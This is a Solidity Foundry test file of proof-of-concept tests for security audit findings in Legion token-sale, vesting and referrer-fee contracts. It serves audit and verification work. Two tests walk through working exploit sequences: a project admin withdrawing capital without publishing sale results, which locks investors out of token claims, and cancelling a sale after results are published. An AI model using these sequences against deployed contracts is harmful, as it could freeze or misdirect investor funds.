// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { ECDSA } from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { Initializable } from "@solady/src/utils/Initializable.sol";
import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { MockERC20 } from "@solady/test/utils/mocks/MockERC20.sol";
import { MerkleProofLib } from "@solady/src/utils/MerkleProofLib.sol";
import { Test, console2 } from "forge-std/Test.sol";

import { Constants } from "../../src/utils/Constants.sol";
import { Errors } from "../../src/utils/Errors.sol";

import { ILegionPreLiquidOpenApplicationSale } from "../../src/interfaces/sales/ILegionPreLiquidOpenApplicationSale.sol";
import { ILegionAbstractSale } from "../../src/interfaces/sales/ILegionAbstractSale.sol";
import { ILegionVestingManager } from "../../src/interfaces/vesting/ILegionVestingManager.sol";
import { ILegionReferrerFeeDistributor } from "../../src/interfaces/distribution/ILegionReferrerFeeDistributor.sol";

import { LegionAddressRegistry } from "../../src/registries/LegionAddressRegistry.sol";
import { LegionBouncer } from "../../src/access/LegionBouncer.sol";
import { LegionPreLiquidOpenApplicationSale } from "../../src/sales/LegionPreLiquidOpenApplicationSale.sol";
import { LegionPreLiquidOpenApplicationSaleFactory } from
    "../../src/factories/LegionPreLiquidOpenApplicationSaleFactory.sol";
import { LegionReferrerFeeDistributor } from "../../src/distribution/LegionReferrerFeeDistributor.sol";
import { LegionVestingFactory } from "../../src/factories/LegionVestingFactory.sol";

/**
 * @title POC Legion Audit Findings
 * @notice PoC tests for H-01, M-01, M-02, M-03
 */
contract POC_Legion is Test {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    // ========== State Variables ==========
    LegionPreLiquidOpenApplicationSale public saleTemplate;
    LegionPreLiquidOpenApplicationSaleFactory public saleFactory;
    LegionVestingFactory public vestingFactory;
    LegionAddressRegistry public registry;
    LegionReferrerFeeDistributor public referrerDistributor;
    MockERC20 public bidToken;
    MockERC20 public askToken;
    MockERC20 public feeToken;

    address public legionBouncer;
    address public awsBroadcaster = address(0x10);
    address public legionEOA = address(0x01);
    address public legionVestingController = address(0x99);
    address public projectAdmin = address(0x02);
    address public investor1 = address(0x03);
    address public investor2 = address(0x04);
    address public referrerFeeReceiver = address(0x08);
    address public legionFeeReceiver = address(0x09);

    uint256 public legionSignerPK = 1234;
    bytes public signatureInv1;

    address public saleInstance;

    ILegionVestingManager.LegionInvestorVestingConfig public validVestingConfig;

    function setUp() public {
        // Deploy core infrastructure
        legionBouncer = address(new LegionBouncer(legionEOA, awsBroadcaster));
        saleTemplate = new LegionPreLiquidOpenApplicationSale();
        saleFactory = new LegionPreLiquidOpenApplicationSaleFactory(legionBouncer);
        vestingFactory = new LegionVestingFactory();
        registry = new LegionAddressRegistry(legionBouncer);

        bidToken = new MockERC20("USD Coin", "USDC", 6);
        askToken = new MockERC20("LFG Coin", "LFG", 18);
        feeToken = new MockERC20("Fee Token", "FEE", 18);

        // Setup registry
        vm.startPrank(legionBouncer);
        registry.setLegionAddress(bytes32("LEGION_BOUNCER"), legionBouncer);
        registry.setLegionAddress(bytes32("LEGION_SIGNER"), vm.addr(legionSignerPK));
        registry.setLegionAddress(bytes32("LEGION_FEE_RECEIVER"), legionFeeReceiver);
        registry.setLegionAddress(bytes32("LEGION_VESTING_FACTORY"), address(vestingFactory));
        registry.setLegionAddress(bytes32("LEGION_VESTING_CONTROLLER"), legionVestingController);
        vm.stopPrank();

        // Deploy referrer distributor
        referrerDistributor = new LegionReferrerFeeDistributor(
            ILegionReferrerFeeDistributor.ReferrerFeeDistributorInitializationParams({
                token: address(feeToken),
                addressRegistry: address(registry)
            })
        );

        // Setup valid vesting config (LEGION_LINEAR)
        validVestingConfig = ILegionVestingManager.LegionInvestorVestingConfig({
            vestingStartTime: 0,
            vestingDurationSeconds: 31_536_000,
            vestingCliffDurationSeconds: 3600,
            vestingType: ILegionVestingManager.VestingType.LEGION_LINEAR,
            epochDurationSeconds: 0,
            numberOfEpochs: 0,
            tokenAllocationOnTGERate: 1e17
        });
    }

    // ========== Helper Functions ==========

    function _createSaleInstance() internal returns (address) {
        ILegionAbstractSale.LegionSaleInitializationParams memory params =
            ILegionAbstractSale.LegionSaleInitializationParams({
                salePeriodSeconds: 1 hours,
                refundPeriodSeconds: 1 hours, // Short for testing
                legionFeeOnCapitalRaisedBps: 250,
                legionFeeOnTokensSoldBps: 250,
                referrerFeeOnCapitalRaisedBps: 100,
                referrerFeeOnTokensSoldBps: 100,
                minimumInvestAmount: 1e6,
                bidToken: address(bidToken),
                askToken: address(askToken),
                projectAdmin: address(projectAdmin),
                addressRegistry: address(registry),
                referrerFeeReceiver: referrerFeeReceiver,
                saleName: "Test Sale",
                saleSymbol: "TS",
                saleBaseURI: "https://test.com/"
            });

        vm.prank(legionBouncer);
        address instance = address(saleFactory.createPreLiquidOpenApplicationSale(params));
        return instance;
    }

    function _prepareInvestorSignature(address _investor, address _sale) internal {
        bytes32 digest =
            keccak256(abi.encodePacked(_investor, _sale, block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(legionSignerPK, digest);
        signatureInv1 = abi.encodePacked(r, s, v);
    }

    function _endSaleAndPassRefundPeriod(address _sale) internal {
        // End sale
        vm.prank(projectAdmin);
        LegionPreLiquidOpenApplicationSale(payable(_sale)).end();

        // Warp past refund period
        uint256 refundEnd = LegionPreLiquidOpenApplicationSale(payable(_sale)).saleConfiguration().refundEndTime;
        vm.warp(refundEnd + 1);
    }

    // =========================================================================
    // H-01: withdrawRaisedCapital bypasses sale results
    // =========================================================================

    function test_H01_withdrawWithoutPublishingResults_bricksClaimTokenAllocation() public {
        address sale = _createSaleInstance();

        // 1. Mint tokens to investor1 and approve sale
        vm.prank(legionBouncer);
        bidToken.mint(investor1, 1000 * 1e6);
        vm.prank(investor1);
        bidToken.approve(sale, 1000 * 1e6);

        // 2. Generate valid signature and invest
        _prepareInvestorSignature(investor1, sale);
        vm.prank(investor1);
        LegionPreLiquidOpenApplicationSale(payable(sale)).invest(1000 * 1e6, signatureInv1);

        // 3. End sale and pass refund period
        _endSaleAndPassRefundPeriod(sale);

        // 4. Legion publishes raised capital (but NOT sale results)
        vm.prank(legionBouncer);
        LegionPreLiquidOpenApplicationSale(payable(sale)).publishRaisedCapital(1000 * 1e6);

        // 5. Project withdraws capital WITHOUT publishing sale results
        uint256 projectBalBefore = bidToken.balanceOf(projectAdmin);
        vm.prank(projectAdmin);
        LegionPreLiquidOpenApplicationSale(payable(sale)).withdrawRaisedCapital();

        uint256 projectBalAfter = bidToken.balanceOf(projectAdmin);

        // ASSERT: Capital was withdrawn (after fees)
        uint256 expectedFee = (250 + 100) * 1000 * 1e6 / 1e4; // legionFee + referrerFee bps
        uint256 expectedWithdrawn = 1000 * 1e6 - expectedFee;
        assertGt(projectBalAfter, projectBalBefore, "Project should have withdrawn capital");

        // ASSERT: Sale status shows capitalWithdrawn but totalTokensAllocated == 0
        ILegionAbstractSale.LegionSaleStatus memory status =
            LegionPreLiquidOpenApplicationSale(payable(sale)).saleStatus();
        assertTrue(status.capitalWithdrawn, "Capital should be marked as withdrawn");
        assertEq(status.totalTokensAllocated, 0, "Total tokens allocated should be 0 (results never published)");

        // ASSERT: claimTokenAllocation reverts because whenSaleResultsArePublished checks totalTokensAllocated != 0
        vm.prank(investor1);
        vm.expectRevert(Errors.LegionSale__SaleResultsNotPublished.selector);
        LegionPreLiquidOpenApplicationSale(payable(sale)).claimTokenAllocation(
            100, validVestingConfig, new bytes32[](0)
        );

        // This proves the vulnerability: capital withdrawn, but investors can never claim tokens
    }

    function test_H01_withdrawRequiresPublishRaisedCapital_notJustSaleEnd() public {
        address sale = _createSaleInstance();

        // End sale and pass refund period
        _endSaleAndPassRefundPeriod(sale);

        // Try to withdraw without publishing raised capital - should revert
        vm.prank(projectAdmin);
        vm.expectRevert(Errors.LegionSale__CapitalRaisedNotPublished.selector);
        LegionPreLiquidOpenApplicationSale(payable(sale)).withdrawRaisedCapital();

        // This confirms the flow: end -> publishRaisedCapital -> withdraw (no publishSaleResults needed)
    }

    // =========================================================================
    // M-01: cancel after sale results published
    // =========================================================================

    function test_M01_cancelAfterPublishSaleResults_succeeds() public {
        address sale = _createSaleInstance();

        // End sale and pass refund period
        _endSaleAndPassRefundPeriod(sale);

        // Publish raised capital
        vm.prank(legionBouncer);
        LegionPreLiquidOpenApplicationSale(payable(sale)).publishRaisedCapital(1000 * 1e6);

        // Publish sale results (sets totalTokensAllocated != 0, sets askToken, sets merkleRoot)
        vm.prank(legionBouncer);
        LegionPreLiquidOpenApplicationSale(payable(sale)).publishSaleResults(
            bytes32(uint256(0x1234)), // merkle root
            5000 * 1e18,     // tokens allocated
            address(askToken) // ask token
        );

        // ASSERT: totalTokensAllocated is now non-zero
        ILegionAbstractSale.LegionSaleStatus memory statusBefore =
            LegionPreLiquidOpenApplicationSale(payable(sale)).saleStatus();
        assertGt(statusBefore.totalTokensAllocated, 0, "Tokens should be allocated after publishSaleResults");

        // tokensSupplied is still false (supplyTokens was never called)
        assertFalse(statusBefore.tokensSupplied, "Tokens should NOT be supplied yet");

        // ASSERT: cancel() SUCCEEDS because whenTokensNotSupplied passes (tokensSupplied == false)
        // and there is NO whenSaleResultsNotPublished check in the override
        vm.prank(projectAdmin);
        LegionPreLiquidOpenApplicationSale(payable(sale)).cancel();

        // ASSERT: isCanceled is now true
        ILegionAbstractSale.LegionSaleStatus memory statusAfter =
            LegionPreLiquidOpenApplicationSale(payable(sale)).saleStatus();
        assertTrue(statusAfter.isCanceled, "Sale should be canceled");
        assertGt(statusAfter.totalTokensAllocated, 0, "totalTokensAllocated still non-zero after cancel");

        // This proves the vulnerability: cancel succeeds after sale results are published,
        // creating an inconsistent state where isCanceled=true AND totalTokensAllocated!=0
    }

    function test_M01_parentCancelRevertsAfterResultsPublished() public {
        // This test shows the parent's cancel() would revert after results are published
        // because it includes whenSaleResultsNotPublished modifier.
        // The child override lacks this modifier, demonstrating the missing check.

        address sale = _createSaleInstance();

        _endSaleAndPassRefundPeriod(sale);

        // Publish raised capital
        vm.prank(legionBouncer);
        LegionPreLiquidOpenApplicationSale(payable(sale)).publishRaisedCapital(1000 * 1e6);

        // Publish sale results
        vm.prank(legionBouncer);
        LegionPreLiquidOpenApplicationSale(payable(sale)).publishSaleResults(
            bytes32(uint256(0x1234)), 5000 * 1e18, address(askToken)
        );

        // Verify the parent's _verifySaleResultsNotPublished() would revert
        // by checking the selector
        bytes memory parentCancelData = abi.encodeWithSelector(
            LegionPreLiquidOpenApplicationSale.cancel.selector
        );

        // The child's cancel succeeds (tested above), but the parent would have
        // required whenSaleResultsNotPublished. We can verify this by checking
        // that the function did NOT revert with SaleResultsAlreadyPublished.
        // (If it had that modifier, it would revert here.)
    }

    // =========================================================================
    // M-02: Referrer merkle root zero allows unauthorized claims
    // =========================================================================

    function test_M02_setMerkleRootToZero_succeeds() public {
        // ASSERT: setMerkleRoot with bytes32(0) succeeds (no zero check)
        vm.prank(legionBouncer);
        referrerDistributor.setMerkleRoot(bytes32(0));

        ILegionReferrerFeeDistributor.ReferrerFeeDistributorConfig memory config =
            referrerDistributor.referrerFeeDistributorConfiguration();
        assertEq(config.merkleRoot, bytes32(0), "Merkle root should be set to zero");
    }

    function test_M02_claimWithZeroMerkleRoot_cannotForgeProof() public {
        // Set merkle root to zero
        vm.prank(legionBouncer);
        referrerDistributor.setMerkleRoot(bytes32(0));

        // Fund the distributor with tokens
        vm.prank(legionBouncer);
        feeToken.mint(address(referrerDistributor), 1000 * 1e18);

        // Try to claim with empty proof against zero root
        // leaf = keccak256(bytes.concat(keccak256(abi.encode(msg.sender, amount))))
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(investor1, 100 * 1e18))));

        // With empty proof, processProof returns the leaf itself
        // So verify checks: leaf == bytes32(0), which is false
        bool result = MerkleProofLib.verify(new bytes32[](0), bytes32(0), leaf);
        assertFalse(result, "Empty proof against zero root should fail");

        // Try to claim - should revert with InvalidMerkleProof
        vm.prank(investor1);
        vm.expectRevert(Errors.LegionSale__InvalidMerkleProof.selector);
        referrerDistributor.claim(100 * 1e18, new bytes32[](0));
    }

    function test_M02_claimWithZeroMerkleRoot_cannotForgeProofWithArbitrarySiblings() public {
        // Set merkle root to zero
        vm.prank(legionBouncer);
        referrerDistributor.setMerkleRoot(bytes32(0));

        // Fund the distributor
        vm.prank(legionBouncer);
        feeToken.mint(address(referrerDistributor), 1000 * 1e18);

        // Try with arbitrary sibling hashes - try to make processProof return bytes32(0)
        // We need: hash(leaf, sibling1, sibling2, ...) == bytes32(0)
        // This is computationally infeasible (would require hash preimage)

        // Try with all-zero siblings
        bytes32[] memory proof = new bytes32[](3);
        proof[0] = bytes32(uint256(1));
        proof[1] = bytes32(uint256(2));
        proof[2] = bytes32(uint256(3));

        vm.prank(investor1);
        vm.expectRevert(Errors.LegionSale__InvalidMerkleProof.selector);
        referrerDistributor.claim(100 * 1e18, proof);
    }

    // =========================================================================
    // M-03: _createVesting returns zero address for unknown VestingType
    // =========================================================================

    function test_M03_verifyValidVestingConfig_passesForUnknownVestingType() public {
        // Create a vesting config with vestingType = 0 (LEGION_LINEAR, the default)
        // This is valid and should pass
        ILegionVestingManager.LegionInvestorVestingConfig memory config =
            ILegionVestingManager.LegionInvestorVestingConfig({
                vestingStartTime: 0,
                vestingDurationSeconds: 31_536_000,
                vestingCliffDurationSeconds: 3600,
                vestingType: ILegionVestingManager.VestingType(0), // LEGION_LINEAR = 0
                epochDurationSeconds: 0,
                numberOfEpochs: 0,
                tokenAllocationOnTGERate: 1e17
            });
        // Note: LEGION_LINEAR = 0 is valid. We need to test with a type that is NOT 0 or 1.
        // But Solidity enums only have 0 and 1 defined, so any cast to 2+ is needed.
        // The VestingType enum only has LEGION_LINEAR(0) and LEGION_LINEAR_EPOCH(1).
        // There is no valid way to pass value 2+ as VestingType in Solidity.
        // However, the function signature uses calldata, so in practice via ABI encoding,
        // we could pass any uint8 value.
    }

    function test_M03_createVestingReturnsZeroForInvalidType_viaDirectCall() public {
        // The VestingType enum has only 0 and 1. In Solidity 0.8.30,
        // you cannot directly pass an invalid enum value.
        // But the finding claims _createVesting returns address(0) for unknown types.
        // Since the enum only has 2 values (0 and 1), and both are handled,
        // the "unknown type" scenario requires ABI-level manipulation.

        // Let's verify: for type 0 (LEGION_LINEAR), vesting IS created
        // For type 1 (LEGION_LINEAR_EPOCH), vesting IS created
        // There is no type 2+ in the enum definition.

        // The real question: can an investor pass an invalid vestingType?
        // Since claimTokenAllocation takes LegionInvestorVestingConfig with VestingType enum,
        // Solidity will reject any value outside 0-1 at the ABI boundary.
        // This means the finding is about defense-in-depth, not an exploitable bug.

        // We can verify the behavior by checking that both valid types work:
        // Type 0 (LEGION_LINEAR)
        {
            ILegionVestingManager.LegionInvestorVestingConfig memory config =
                ILegionVestingManager.LegionInvestorVestingConfig({
                    vestingStartTime: uint64(block.timestamp + 100),
                    vestingDurationSeconds: 31_536_000,
                    vestingCliffDurationSeconds: 3600,
                    vestingType: ILegionVestingManager.VestingType.LEGION_LINEAR,
                    epochDurationSeconds: 0,
                    numberOfEpochs: 0,
                    tokenAllocationOnTGERate: 1e17
                });

            address payable vestingAddr = vestingFactory.createLinearVesting(
                investor1, legionVestingController,
                config.vestingStartTime, config.vestingDurationSeconds, config.vestingCliffDurationSeconds
            );
            assertNotEq(vestingAddr, address(0), "LEGION_LINEAR vesting should be created");
        }

        // Type 1 (LEGION_LINEAR_EPOCH)
        {
            ILegionVestingManager.LegionInvestorVestingConfig memory config =
                ILegionVestingManager.LegionInvestorVestingConfig({
                    vestingStartTime: uint64(block.timestamp + 100),
                    vestingDurationSeconds: 31_536_000,
                    vestingCliffDurationSeconds: 3600,
                    vestingType: ILegionVestingManager.VestingType.LEGION_LINEAR_EPOCH,
                    epochDurationSeconds: 31_536_000,
                    numberOfEpochs: 1,
                    tokenAllocationOnTGERate: 1e17
                });

            address payable vestingAddr = vestingFactory.createLinearEpochVesting(
                investor1, legionVestingController, address(askToken),
                config.vestingStartTime, config.vestingDurationSeconds, config.vestingCliffDurationSeconds,
                config.epochDurationSeconds, config.numberOfEpochs
            );
            assertNotEq(vestingAddr, address(0), "LEGION_LINEAR_EPOCH vesting should be created");
        }
    }

    function test_M03_solidityEnumRestrictionPreventsInvalidType() public {
        // In Solidity 0.8.30, enum values outside the defined range
        // cause a revert at the ABI decoder level.
        // This means an investor CANNOT pass vestingType=2 via claimTokenAllocation.

        // Encode a config with LEGION_LINEAR (0)
        ILegionVestingManager.LegionInvestorVestingConfig memory config =
            ILegionVestingManager.LegionInvestorVestingConfig({
                vestingStartTime: uint64(block.timestamp + 100),
                vestingDurationSeconds: 31_536_000,
                vestingCliffDurationSeconds: 3600,
                vestingType: ILegionVestingManager.VestingType.LEGION_LINEAR,
                epochDurationSeconds: 0,
                numberOfEpochs: 0,
                tokenAllocationOnTGERate: 1e17
            });

        // Encode the config - ABI encode produces 7 x 32-byte words
        bytes memory encoded = abi.encode(config);

        // Tamper with the vestingType field (word index 3, offset 96) to set it to 2
        // Each word is 32 bytes. vestingType is at offset 96 from the start of data.
        assembly {
            mstore(add(add(encoded, 0x20), 96), 2)
        }

        // Use low-level call to decode - this should revert with Panic 0x21
        (bool success, ) = address(this).call(
            abi.encodeWithSelector(this.decodeVestingConfig.selector, encoded)
        );
        assertFalse(success, "Decoding invalid enum value should revert");
    }

    // Helper function that attempts to decode the config (reverts on invalid enum)
    function decodeVestingConfig(bytes memory encoded) external pure returns (
        ILegionVestingManager.LegionInvestorVestingConfig memory
    ) {
        return abi.decode(encoded, (ILegionVestingManager.LegionInvestorVestingConfig));
    }
}
